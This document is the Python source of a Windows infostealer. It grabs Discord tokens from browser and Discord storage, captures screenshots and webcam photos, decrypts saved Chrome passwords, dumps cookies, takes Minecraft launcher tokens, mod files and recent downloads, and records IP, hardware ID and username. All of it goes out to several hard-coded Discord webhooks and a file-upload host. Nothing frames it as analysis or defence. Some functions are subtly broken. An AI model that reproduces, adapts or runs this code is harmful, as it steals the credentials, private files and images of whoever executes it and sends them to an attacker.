from discord_webhook import DiscordWebhook, DiscordEmbed, webhook
from os import environ, path
import json
import cv2
import requests
import time
from cv2 import *
import re
import browser_cookie3
from zipfile import ZipFile
import zipfile
from json import dumps
import datetime
from urllib.request import Request, urlopen
import os
from PIL import ImageGrab
from requests.models import Response
import pathlib
from win32crypt import CryptUnprotectData
import json
import base64
from discord_webhook import DiscordWebhook, DiscordEmbed, webhook
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import datetime, timedelta
from base64 import b64decode
import urllib.request
import getpass
import subprocess

webhook_1 = ()
webhook_2 = ()
webhook_3 = ()

class Stealer():
    def __init__(self):
        self.Roaming    = os.getenv('APPDATA')
        self.Local      = os.getenv('LOCALAPPDATA')
        self.Discord_Path = [
                                "ROAMING\\Discord\\",
                                "ROAMING\\Lightcord\\",
                                "ROAMING\\discordptb\\",
                                "ROAMING\\discordcanary\\",
                                "ROAMING\\Opera Software\\Opera Stable\\",
                                "ROAMING\\Opera Software\\Opera GX Stable\\",
                                
                                
                                "LOCAL\\Amigo\\User Data\\",
                                "LOCAL\\Torch\\User Data\\",
                                "LOCAL\\Kometa\\User Data\\",
                                "LOCAL\\Orbitum\\User Data\\",
                                "LOCAL\\CentBrowser\\User Data\\",
                                "LOCAL\\7Star\\7Star\\User Data\\",
                                "LOCAL\\Sputnik\\Sputnik\\User Data\\",
                                "LOCAL\\Vivaldi\\User Data\\Default\\",
                                "LOCAL\\Google\\Chrome SxS\\User Data\\",
                                "LOCAL\\Epic Privacy Browser\\User Data\\",
                                "LOCAL\\Google\\Chrome\\User Data\\Default\\",
                                "LOCAL\\uCozMedia\\Uran\\User Data\\Default\\",
                                "LOCAL\\Microsoft\\Edge\\User Data\\Default\\",
                                "LOCAL\\Yandex\\YandexBrowser\\User Data\\Default\\",
                                "LOCAL\\Opera Software\\Opera Neon\\User Data\\Default\\", 
                                "LOCAL\\BraveSoftware\\Brave-Browser\\User Data\\Default\\",
                            ]

    def get_tokens(self):
        TokenList  = []
        TokenFirst = []
        for Path in self.Discord_Path:
            Path = Path.replace('ROAMING', self.Roaming).replace('LOCAL', self.Local)
            if not os.path.exists(Path):
                continue
            else:
                Path += 'Local Storage\\leveldb'
                if not os.path.exists(Path):
                    continue
                for file_name in os.listdir(Path):
                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                        continue
                    for line in [x.strip() for x in open(f'{Path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                            for token in re.findall(regex, line):
                                if token[:20] not in TokenFirst:
                                    TokenFirst.append(token[:20])
                                    TokenList.append(token)
            return TokenList



def sendtoken(webhook_2):
    Tokengrab = Stealer()
    token_list = Tokengrab.get_tokens()   
    
    unique_tokens = []
    string = '```ASM\n'
    for token in token_list:
        if token not in unique_tokens:
            unique_tokens.append(token)
            string += f'{token}\n'
    string += '```'

    webhook = DiscordWebhook(url=webhook_2)

    embed = DiscordEmbed(title='Token was taken', description='@everyone', color='000001')
    embed.add_embed_field(name='Token', value=string)
    embed.set_timestamp()

    webhook.add_embed(embed)
    response = webhook.execute()


def ScrenGrabber(webhook):
    screenshot = ImageGrab.grab()
    screenshot.save(os.getenv('ProgramData') +r'\screenshot.jpg')
    screenshot = open(r'C:\ProgramData\screenshot.jpg', 'rb')
    screenshot.close()

    webhook = DiscordWebhook(url=webhook)

    embed = DiscordEmbed(title='Screnshot was taken', description='@everyone', color='000001')
    embed.set_timestamp()

    with open('C:\ProgramData\screenshot.jpg', "rb") as f:
        webhook.add_file(file=f.read(), filename='screenshot.jpg')

    embed.set_image(url='attachment://screenshot.jpg')
    webhook.add_embed(embed)

    response = webhook.execute()

    os.remove("C:\ProgramData\screenshot.jpg")

def webcamgrabber():
	cam = cv2.VideoCapture(0)
	try:
		ret, frame = cam.read()
		img_name = "cam.jpg" 
		cv2.imwrite(img_name, frame)
		try:
			screenshotRaw = requests.post('https://srv-store2.gofile.io/uploadFile', files={'file': (f'{os.getcwd()}\\{img_name}', open(f'{os.getcwd()}\\{img_name}', 'rb')),}).text
			screenshotUploaded = f"[cam]({screenshotRaw[87:113]})" 
		except:
			screenshotUploaded = "cam: N/A" 
			pass
	except:
		pass
	cam.release()
	cv2.destroyAllWindows()

def send_cam(webhook):
    img_name = "cam.jpg" 
    webhook = DiscordWebhook(url=webhook)

    embed = DiscordEmbed(title='Say hi to the camera :flushed:', description='@everyone nice face loser', color='000001')
    embed.set_timestamp()

    with open('cam.jpg', "rb") as f:
        webhook.add_file(file=f.read(), filename='cam.jpg')

    embed.set_image(url='attachment://cam.jpg')    
    webhook.add_embed(embed)

    Response = webhook.execute()

    os.remove(f'{os.getcwd()}\\{img_name}') 

class ZipUtilities:

    def toZip(self, file, filename):
        zip_file = zipfile.ZipFile(filename, 'w')
        if os.path.isfile(file):
                    zip_file.write(file)
        else:
            self.addFolderToZip(zip_file, file)
        zip_file.close()

    def addFolderToZip(self, zip_file, folder): 
        for file in os.listdir(folder):
            full_path = os.path.join(folder, file)
            if os.path.isfile(full_path):
                zip_file.write(full_path)
            elif os.path.isdir(full_path):
                self.addFolderToZip(zip_file, full_path)

def Mods(webhook):
    utilities = ZipUtilities()
    directory = os.getenv('APPDATA')+'\\.minecraft\\mods/'
    file = os.listdir(os.getenv('APPDATA')+'\\.minecraft\\mods')


    with ZipFile('Mods.zip','w') as zip:
        for elem in file:
            print(elem)
            zip.write(directory+elem)

    size = os.path.getsize('Mods.zip')
    print(size)

    if(size<=8000000):
        with open('Mods.zip', "rb") as f:
            webhook = DiscordWebhook(url=webhook)
            webhook.add_file(file=f.read(), filename="Mods.zip")
    else:
        webhook = DiscordWebhook(url=webhook, content='zip to large for Discord')

    response = webhook.execute()
    os.remove("Mods.zip")

def cookieLog(webhook):
    cookies = list(browser_cookie3.chrome())
    f = open("cookies.txt","w+")
    for item in cookies:
            f.write("%s\n" % item)

    webhook = DiscordWebhook(url=webhook)

    with open('cookies.txt', "rb") as f:
        webhook.add_file(file=f.read(), filename='cookies.txt')

    response = webhook.execute()

    os.remove("cookies.txt")

def ctime(elem):
    dire = str(os.path.join(pathlib.Path.home(), "Downloads"))+'/'

    fname=pathlib.Path(dire+elem)

    rtime = str(datetime.now())
    mtime = str(datetime.fromtimestamp(fname.stat().st_mtime))
    local = rtime
    file = mtime

    def cut(var):
        start = 11
        stop = 25

        if len(var) > stop :
            var = var[0: start:] + var[stop + 1::]
            return var

        cfile = cut(file)
        clocal = cut(local)

        if (clocal == cfile):
            return True
        else:
            return False

def Downloads(webhook):
    utilities = ZipUtilities()
    files = os.listdir(str(os.path.join(pathlib.Path.home(), "Downloads")))
    dire = str(os.path.join(pathlib.Path.home(), "Downloads"))+'/'

    with ZipFile('downloads.zip','w') as zip:
        for elem in files:
            if (ctime(elem)):
                zip.write(dire+elem)

    size = os.path.getsize('downloads.zip')
    print(size)

    if(size<=8000000):
        with open('downloads.zip', "rb") as f:
            webhook = DiscordWebhook(url=webhook)
            webhook.add_file(file=f.read(), filename="downloads.zip")
    else:
        webhook = DiscordWebhook(url=webhook, content='zip to large for Discord')

    response = webhook.execute()
    os.remove("downloads.zip")

def passwordLog():
        try:
            def get_chrome_datetime(chromedate):
                return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

            def get_encryption_key():
                local_state_path = os.path.join(os.environ["USERPROFILE"],
                                                "AppData", "Local", "Google", "Chrome",
                                                "User Data", "Local State")
                with open(local_state_path, "r", encoding="utf-8") as f:
                    local_state = f.read()
                    local_state = json.loads(local_state)

                key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                key = key[5:]
                return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

            def decrypt_password(password, key):
                try:
                    iv = password[3:15]
                    password = password[15:]
                    cipher = AES.new(key, AES.MODE_GCM, iv)
                    return cipher.decrypt(password)[:-16].decode()
                except:
                    try:
                        return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
                    except:
                        return ""

            key = get_encryption_key()
            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                    "Google", "Chrome", "User Data", "default", "Login Data")
            filename = "ChromeData.db"
            shutil.copyfile(db_path, filename)
            db = sqlite3.connect(filename)
            cursor = db.cursor()
            cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
            passwordFile = open("passwords.txt", "a")
            for row in cursor.fetchall():
                origin_url = row[0]
                action_url = row[1]
                username = row[2]
                password = decrypt_password(row[3], key)
                row[4]
                row[5]
                if username or password:
                    passwordFile.write(f"Origin URL: {origin_url}\nAction URL: {action_url}\nUsername: {username}\nPassword: {password}" + "\n" + "-" * 50 + "\n")
                else:
                    continue
            cursor.close()
            db.close()
        except Exception as e:
            print(e)

WEBHOOK_URL = "https://discord.com/api/webhooks/906742782146781246/7aRpzYpOk-6csXZxLFyW_G768ii73MwhduuE2N0w9U770lludL-6EfGh2F5-bZ2gsMr5"

def uuid_dashed(uuid):
    return f"{uuid[0:8]}-{uuid[8:12]}-{uuid[12:16]}-{uuid[16:21]}-{uuid[21:32]}"

def main():
    auth_db = json.loads(open(os.getenv("APPDATA") + "\\.minecraft\\launcher_profiles.json").read())["authenticationDatabase"]

    embeds = []

    for x in auth_db:
        try:
            email = auth_db[x].get("username")
            uuid, display_name_object = list(auth_db[x]["profiles"].items())[0]
            embed = {
                "fields": [
                    {"name": "Email", "value": email if email and "@" in email else "N/A", "inline": False},
                    {"name": "Username", "value": display_name_object["displayName"].replace("_", "\\_"), "inline": True},
                    {"name": "UUID", "value": uuid_dashed(uuid), "inline": True},
                    {"name": "Token", "value": auth_db[x]["accessToken"], "inline": True}
                ]
            }
            embeds.append(embed)
        except:
            pass

    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }

    payload = json.dumps({"embeds": embeds, "content":""})
    
    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass

def passSend(webhook):
        webhook = DiscordWebhook(url=webhook)

        with open('passwords.txt', "rb") as f:
            webhook.add_file(file=f.read(), filename='passwords.txt')

        response = webhook.execute()
        os.remove("passwords.txt")
        os.remove("ChromeData.db")

def personal(webhook):
    ip = str(urllib.request.urlopen('http://ip.42.pl/raw').read())
    name = os.name
    hwid = str(subprocess.check_output('wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip()
    user = getpass.getuser()
    ip = ip.replace('b', '')
    if name=="nt":
        name = 'Windows'

    webhook = DiscordWebhook(url=webhook)

    embed = DiscordEmbed(
        title="Info", description="PC info", color='000001'
    )

    embed.set_timestamp()
    embed.add_embed_field(name="Os Name", value=name, inline=False)
    embed.add_embed_field(name="HWID", value=hwid, inline=False)
    embed.add_embed_field(name="Username", value=user, inline=False)
    embed.add_embed_field(name="IP", value=ip, inline=False)

    webhook.add_embed(embed)
    response = webhook.execute()


#w = link WebHook
if __name__ == '__main__':
    webcamgrabber()
    personal('https://discord.com/api/webhooks/905657525104427088/rJDFMum0MzCVNqjoXv2CzslJ7__RKk9YmoHwsjv4v7DepzgwB2c3g_CqZ0ZC92goX5uz')
    time.sleep(2)
    ScrenGrabber('https://discord.com/api/webhooks/905657998758785086/We1hHEtquqjcsASn2wwaNodhy94HtAp7l1iFKsbLxpwkMLZU3g5qhYElsvy_cB_bjgjJ')
    time.sleep(2)
    sendtoken('https://discord.com/api/webhooks/905657832089731092/SJt3z8y814v0obMCevd3-Gb15HC0LY2wkCeNBL9ylWx8qtSYqUr5nNB-6jXHENtZGFtF')
    time.sleep(2)
    send_cam('https://discord.com/api/webhooks/905658626801283073/R5MpJNRz3fe5tcrNs-pG-Fcb9lFwB6XA12vcENI_2_DT_Aq7tB5MMD7Syy_d6HHUu4Qs')
    time.sleep(2)
    Mods('https://discord.com/api/webhooks/905658419883679825/3lXYbxTRaVJRCOeuWr3bS_6ovASiIc2eGWSluMpodCmio8r4rb51Q0pC-tabC1VrNuWg')
    time.sleep(2)
    Downloads('https://discord.com/api/webhooks/905658879222898779/HsLq1o_ZsFI3t7sPl0oZ9gjUG_p-ZWMHgxVfQULPNB27AY2-J2Ibcfq7NTD8GAGQ65Vv')
    time.sleep(2)
    cookieLog('https://discord.com/api/webhooks/905657139861798913/j6BodgJjGSYjFQQf-OnWxVro8fDufI7G7ZweHnp7PV89_jnOVB8n6Wz4zGlZyTlzk9Ge')
    time.sleep(2)
    passwordLog()
    passSend('https://discord.com/api/webhooks/905659143069761536/3kfql7mQxNjJdAMealol0yCSlaCFIcKZMMx0Dym0NME3l6EM1jL2VsRXaLPR_PjE01fG')